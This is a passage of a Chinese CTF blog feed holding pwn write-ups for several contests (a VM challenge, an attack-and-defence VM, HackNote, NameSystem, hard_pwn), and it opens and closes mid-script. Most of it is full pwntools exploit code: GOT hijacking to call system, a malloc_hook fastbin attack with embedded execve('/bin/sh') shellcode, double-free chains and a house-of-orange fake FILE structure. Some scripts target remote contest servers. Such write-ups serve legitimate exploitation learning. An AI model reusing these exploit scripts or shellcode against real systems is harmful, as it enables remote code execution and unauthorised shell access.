class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x00'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addreg</span><span class="params">(reg)</span>:</span><span class="comment">#将任意寄存器的值加一</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x20'</span>+p8(reg)</span><br></pre></td></tr></table></figure><p>通过上面四条指令可以达到任意地址的读写</p><p>我的思路是首先将got表泄露出来，然后劫持free的got表，从而达到getshell</p><p>当然，VM是很灵活的解题，解题思路不止一种，因为我只用到了他为数不多的几个指令，还有其他完全不同的思路解题。这就是我喜欢VM的原因，全靠自己逆向，自己的自由度很高，这一题还有一种思路就是通过寄存器的越界读写，修改存放栈的地址，改为got表，也能达到劫持got表的目的，这个想法应该是可行的，就和第一道题的思路类似。</p><p>我的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./pwn3"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    script=<span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x80489A3</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(p,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">play</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movimm</span><span class="params">(reg,imm)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x03'</span>+p8(reg)+p32(imm)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">putchar</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x01'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getchar</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x00'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addreg</span><span class="params">(reg)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x20'</span>+p8(reg)</span><br><span class="line"></span><br><span class="line">payload=movimm(<span class="number">3</span>,<span class="number">0x0804B014</span>)+putchar()+addreg(<span class="number">3</span>)+putchar()+addreg(<span class="number">3</span>)+putchar()+addreg(<span class="number">3</span>)+putchar()</span><br><span class="line">payload+=<span class="string">'\xb0'</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">new(payload)</span><br><span class="line">play()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">printf_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">free()</span><br><span class="line">libc=LibcSearcher(<span class="string">"printf"</span>,printf_addr)</span><br><span class="line">system_addr=printf_addr-libc.dump(<span class="string">"printf"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">payload=movimm(<span class="number">0</span>,u32(<span class="string">'sh\x00\x00'</span>))+movimm(<span class="number">3</span>,<span class="number">0x804B018</span>)+getchar()+addreg(<span class="number">3</span>)+getchar()+addreg(<span class="number">3</span>)+getchar()+addreg(<span class="number">3</span>)+getchar()+<span class="string">'\xb0'</span></span><br><span class="line">new(payload)</span><br><span class="line">play()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(p32(system_addr)[<span class="number">0</span>])</span><br><span class="line">p.send(p32(system_addr)[<span class="number">1</span>])</span><br><span class="line">p.send(p32(system_addr)[<span class="number">2</span>])</span><br><span class="line">p.send(p32(system_addr)[<span class="number">3</span>])</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>关于怎么防守，说实话，我是没怎么想清楚怎么去防守。因为利用点太多了，真的很困难。</p><h2 id="0x03-粤湾证券"><a href="#0x03-粤湾证券" class="headerlink" title="0x03 粤湾证券"></a>0x03 粤湾证券</h2><p>这道题是一个攻守兼备的一个VM，根据他提供的VM 来进行逆向分析他的指令集，然后再通过你提供的defense脚本和payload来进行一个攻守兼备的一个模式。</p><p>首先看一下这一题开启的保护</p><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>这一道题很无脑，因为它调用了dlsym,通过这个函数可以直接调用system。不过当时在现场不太了解这个函数，并且没有外网环境，并不知道这个函数用法。对这个函数进行盲测花了很长时间导致其他题没时间做了。这个函数把libc当做handle,第二参数为函数名称的字符串，就会返回函数的真实地址。所以这道题一点都不难，不过可惜在于当时一直以为是函数在libc的偏移量作为函数第二个参数，返回函数真实地址。</p><p>我的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./pwn2"</span>)</span><br><span class="line"><span class="comment">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line"><span class="comment">#p=remote("172.16.9.41",9002)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(code)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Give me code:"</span>,base64.b64encode(code))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"gift:0x"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">gift=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">"gift====&gt;0x%x"</span>%gift)</span><br><span class="line">code=p64(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(gift+<span class="number">0x0001B3E9A</span>)+p64(<span class="number">0x40</span>)+p64(u64(<span class="string">'system'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))+p64(gift+<span class="number">0x0001B3E9A</span>)</span><br><span class="line">new(code)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>我的编写defense的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/defense"</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(p64(<span class="number">0x20</span>)+p64(u64(<span class="string">'system'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))+p64(u64(<span class="string">'system'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))))</span><br></pre></td></tr></table></figure><p>个人觉得，这个题是最好玩的一个题，希望以后的比赛多来点这种题。不是因为简单，而是因为这个题这种攻守兼备的模式。以题目作为媒介，自己编写攻击和防御脚本来进行对抗，这一点我特别喜欢。不像传统的AWD，通过去修改文件，来修复漏洞，那样少了许多攻击灵活性，但是也不像前道VM题攻击的那么灵活，让你修的无法下手，增加了许多防守的稳定性。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近做了vm的pwnt题才发现Vm的pwn题是真的有意思，做vm的关键在于逆向，我的逆向太菜了，逆的太慢了，做题速度直接与逆向速度挂钩，导致就做出来一道题，哭了。随便提一句有的没的，广州是真的好，主办方是我见过最良心的主办方，大气+多金。还有一道关于json的pwn,我实在
      
    
    </summary>
    
    
      <category term="Wirteup" scheme="http://Whali3n51.github.io/categories/Wirteup/"/>
    
      <category term="赛题复现" scheme="http://Whali3n51.github.io/categories/Wirteup/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="VMpwn" scheme="http://Whali3n51.github.io/tags/VMpwn/"/>
    
  </entry>
  
  <entry>
    <title>湖湘杯线上赛pwn_wp</title>
    <link href="http://whali3n51.github.io/2019/11/11/%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwn_wp/"/>
    <id>http://whali3n51.github.io/2019/11/11/%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwn_wp/</id>
    <published>2019-11-11T06:14:00.000Z</published>
    <updated>2020-01-08T07:07:23.779Z</updated>
    
    <content type="html"><![CDATA[<p>难度刚刚好，我能做出来，但是又不是那么容易做出来。最后可惜，没能进线下，ak了pwn也无济于事。</p><h2 id="0x01-Hacknote"><a href="#0x01-Hacknote" class="headerlink" title="0x01 Hacknote"></a>0x01 Hacknote</h2><p>静态编译的一个题，没开pie，没开nx,可以getshell，漏洞就是off-by-one,比赛的时候巨鸡儿坑，坑死我了，第一次的附件chunk是存在bss段的,然后我就想了个简单的办法，直接用unlink的方式做，但是尼玛服务器上面的程序chunk指针不是在bss段上，而是在栈上。当我发现的时候我简直无语了。最后附件更新四五次，浪费我大量时间在这上面。最后getshell的办法就是利用off-by-one造成堆块重叠，利用fast bin attack，攻击malloc_hook,攻击的时候，修改malloc_hook指向malloc_hook地址的随后的八个字节，修改的同时，在malloc_hook后面写上shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process("./HackNote")</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.62"</span>,<span class="number">16804</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"-----------------\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the Size:\n"</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">"Input the Note:\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"-----------------\n"</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the Index of Note:\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"-----------------\n"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the Index of Note:\n"</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">"Input the Note:\n"</span>,content)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x38</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x88</span>,<span class="string">'a'</span>*<span class="number">0x1</span>+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0xf8</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x270</span>)+<span class="string">'\x90'</span></span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x38</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x6cb772</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x38</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x38</span>,<span class="string">'aaaaaa'</span>+p64(<span class="number">0x6cb790</span>)+<span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span>+<span class="string">'\x00\n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"-----------------\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the Size:\n"</span>,str(<span class="number">23</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x02-NameSystem"><a href="#0x02-NameSystem" class="headerlink" title="0x02 NameSystem"></a>0x02 NameSystem</h2><p>这个题的漏洞如果不仔细看，是真的看不出来，在free的时候，将当前chunk指针清零，并将后面指针往迁移。如果粗略的看，这样是没有什么问题的。但是仔细思考，当我们堆块为满的时候，前面任何一个chunk的指针被清零后，最后的一个chunk会赋值前移，造成的效果就是第19和第20个的chunk值一模一样，这样就造成悬挂指针，也就是可以double free了。getshell的主要思路就是攻击got表和存放chunk指针的bss段来泄露lib和getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./NameSystem"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./NameSystem"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="comment">#p=remote("183.129.189.62",21305)</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Name Size:"</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">"Name:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"The id you want to delete:"</span>,str(index))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">create(<span class="number">0x50</span>,p64(<span class="number">0x601ffa</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x50</span>,p64(<span class="number">0x601ffa</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x50</span>,p64(<span class="number">0x601ffa</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x60</span>,p64(<span class="number">0x60208d</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x60</span>,p64(<span class="number">0x60208d</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x60</span>,p64(<span class="number">0x60208d</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'aaa'</span>+p64(<span class="number">0x602080</span>)+p64(<span class="number">0x000000000060200a</span>)+<span class="string">'\n'</span>)</span><br><span class="line">onegad=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'aaaaaa'</span>+p64(<span class="number">0x41</span>)+p64(elf.symbols[<span class="string">'puts'</span>])[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">stdout=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base=stdout-(<span class="number">0x00007ffff7dd2620</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">success(<span class="string">"libc====&gt;0x%x"</span>%libc_base)</span><br><span class="line">pause()</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">create(<span class="number">0x30</span>,p64(<span class="number">0x602008</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x30</span>,p64(<span class="number">0x602008</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x30</span>,p64(system)[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;难度刚刚好，我能做出来，但是又不是那么容易做出来。最后可惜，没能进线下，ak了pwn也无济于事。&lt;/p&gt;
&lt;h2 id=&quot;0x01-Hacknote&quot;&gt;&lt;a href=&quot;#0x01-Hacknote&quot; class=&quot;headerlink&quot; title=&quot;0x01 Hackn
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.github.io/categories/Writeup/"/>
    
    
      <category term="double free" scheme="http://Whali3n51.github.io/tags/double-free/"/>
    
      <category term="shellcode" scheme="http://Whali3n51.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>HECTF_Pwn_wp</title>
    <link href="http://whali3n51.github.io/2019/11/11/HECTF/"/>
    <id>http://whali3n51.github.io/2019/11/11/HECTF/</id>
    <published>2019-11-11T05:51:00.000Z</published>
    <updated>2020-01-08T06:52:44.102Z</updated>
    
    <content type="html"><![CDATA[<p>这个比赛我没怎么玩，主要是比赛当天有事，据说是新手向的题目，是河北师范大学举办的比赛，我只做了里面几道题。</p><h2 id="0x01-hard-pwn"><a href="#0x01-hard-pwn" class="headerlink" title="0x01 hard_pwn"></a>0x01 hard_pwn</h2><p>就存在一个off-by-one，可以直接解造成堆块重叠，进而使用house of orange来getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">':'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"4"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./hard_pwn")</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10026</span>)</span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#3</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,<span class="number">0xf0</span>*<span class="string">'a'</span>+p64(<span class="number">0x1a0</span>)+p64(<span class="number">0xa0</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"You play is "</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x00007ffff7dd1b78</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">_IO_list_all=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">success(<span class="string">"libc_base=====&gt;0x%x"</span>%libc_base)</span><br><span class="line">pause()</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0xa0</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+fake_file)</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x18cd57</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">fake_file+=p64(libc_base+<span class="number">0x3c37a0</span><span class="number">-8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)</span><br><span class="line">fake_file+=p64(libc_base+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">1</span>,<span 